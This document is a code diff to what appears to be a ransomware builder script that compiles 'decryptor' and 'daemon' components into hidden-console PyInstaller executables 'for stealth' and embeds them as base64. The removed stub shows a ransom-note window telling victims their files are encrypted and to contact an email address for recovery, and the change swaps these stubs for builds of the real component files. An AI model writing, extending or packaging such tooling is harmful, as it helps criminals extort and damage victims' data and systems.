@@ -114,13 +114,16 @@ def build_executable(script_path, program_name, icon_path=None):
         sys.executable, "-m", "PyInstaller",
         "--clean",
         "--onefile",
-        "--noconsole",  # No console window for stealth
         temp_script,
         "--name", program_name,
         "--distpath", output_dir,
         "--specpath", tempfile.mkdtemp(),  # Use temp dir for spec file
         "--log-level", "INFO"
     ]
+
+    # Add --noconsole option only for non-decryptor executables
+    if program_name != "decryptor":
+        pyinstaller_args.append("--noconsole")  # No console window for stealth
     
     # Add UPX compression if available
     upx_dirs = [
@@ -147,6 +150,19 @@ def build_executable(script_path, program_name, icon_path=None):
             "--hidden-import", "cryptography.hazmat.backends.openssl",
             "--hidden-import", "cryptography.hazmat.primitives.asymmetric.rsa",
             "--hidden-import", "cryptography.hazmat.primitives.serialization",
+            "--hidden-import", "win32api",
+            "--hidden-import", "win32con"
+        ])
+    elif program_name == "decryptor":
+        # Add any specific imports needed for decryptor
+        pyinstaller_args.extend([
+            "--hidden-import", "cryptography.hazmat.backends.openssl",
+            "--hidden-import", "cryptography.hazmat.primitives.asymmetric.rsa",
+            "--hidden-import", "cryptography.hazmat.primitives.serialization",
+        ])
+    elif program_name == "daemon":
+        # Add any specific imports needed for daemon
+        pyinstaller_args.extend([
             "--hidden-import", "win32api",
             "--hidden-import", "win32con"
         ])
@@ -201,97 +217,26 @@ def build_executable(script_path, program_name, icon_path=None):
     
     return None
 
-def create_minimal_executables():
-    """Create minimal stub executables for decryptor and daemon"""
-    info("Creating minimal stub executables...")
+def build_component_executables():
+    """Build executables from existing component files"""
+    info("Building component executables from existing files...")
     
-    # Output directory
-    output_dir = normalize_path(args.output)
+    # Find script files
+    decryptor_script = find_script("decryptor")
+    daemon_script = find_script("daemon")
     
-    # Minimal Python script for decryptor stub
-    decryptor_script = """
-import os
-import sys
-import ctypes
-import tkinter as tk
-from tkinter import messagebox
-
-def main():
-    # Set window title
-    ctypes.windll.kernel32.SetConsoleTitleW("Recovery Tool")
+    if not decryptor_script:
+        error("decryptor.py not found - cannot continue")
     
-    # Create GUI
-    root = tk.Tk()
-    root.title("File Recovery Tool")
-    root.geometry("400x300")
-    root.resizable(False, False)
-    
-    # Add recovery instructions
-    tk.Label(root, text="Your files are encrypted.", font=("Arial", 14, "bold")).pack(pady=10)
-    tk.Label(root, text="To recover your files, contact us at:", font=("Arial", 12)).pack(pady=5)
-    tk.Label(root, text="recovery@securemail.com", font=("Arial", 12, "bold")).pack(pady=5)
-    
-    # ID entry
-    tk.Label(root, text="Enter your recovery ID:", font=("Arial", 10)).pack(pady=5)
-    id_entry = tk.Entry(root, width=40)
-    id_entry.pack(pady=5)
-    
-    # Key entry
-    tk.Label(root, text="Enter your decryption key:", font=("Arial", 10)).pack(pady=5)
-    key_entry = tk.Entry(root, width=40)
-    key_entry.pack(pady=5)
-    
-    # Button
-    tk.Button(root, text="Decrypt Files", font=("Arial", 10, "bold"), 
-              command=lambda: messagebox.showinfo("Status", "Decryption key validation in progress...")).pack(pady=20)
-    
-    root.mainloop()
-
-if __name__ == "__main__":
-    main()
-"""
-    
-    # Minimal Python script for daemon stub
-    daemon_script = """
-import os
-import sys
-import time
-import threading
-
-def monitoring_task():
-    while True:
-        time.sleep(60)
-
-def main():
-    # Start monitoring in background
-    thread = threading.Thread(target=monitoring_task)
-    thread.daemon = True
-    thread.start()
-    
-    # Keep process alive
-    while True:
-        time.sleep(3600)
-
-if __name__ == "__main__":
-    main()
-"""
-    
-    # Create temporary files
-    with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as decryptor_file:
-        decryptor_file.write(decryptor_script.encode('utf-8'))
-        decryptor_path = decryptor_file.name
-    
-    with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as daemon_file:
-        daemon_file.write(daemon_script.encode('utf-8'))
-        daemon_path = daemon_file.name
+    if not daemon_script:
+        error("daemon.py not found - cannot continue")
     
     # Build executables
-    decryptor_b64 = build_executable(decryptor_path, "decryptor")
-    daemon_b64 = build_executable(daemon_path, "daemon")
+    decryptor_b64 = build_executable(decryptor_script, "decryptor")
+    daemon_b64 = build_executable(daemon_script, "daemon")
     
-    # Clean up temporary files
-    os.unlink(decryptor_path)
-    os.unlink(daemon_path)
+    if not decryptor_b64 or not daemon_b64:
+        error("Failed to build component executables")
     
     return decryptor_b64, daemon_b64
 
@@ -421,9 +366,9 @@ def main():
     # Install requirements
     install_requirements()
     
-    # Create small minimal stub executables
-    info("Creating minimal stub executables...")
-    decryptor_b64, daemon_b64 = create_minimal_executables()
+    # Build component executables from existing files
+    info("Building component executables from your existing files...")
+    decryptor_b64, daemon_b64 = build_component_executables()
     
     # Encode image if provided
     img_b64 = encode_image()
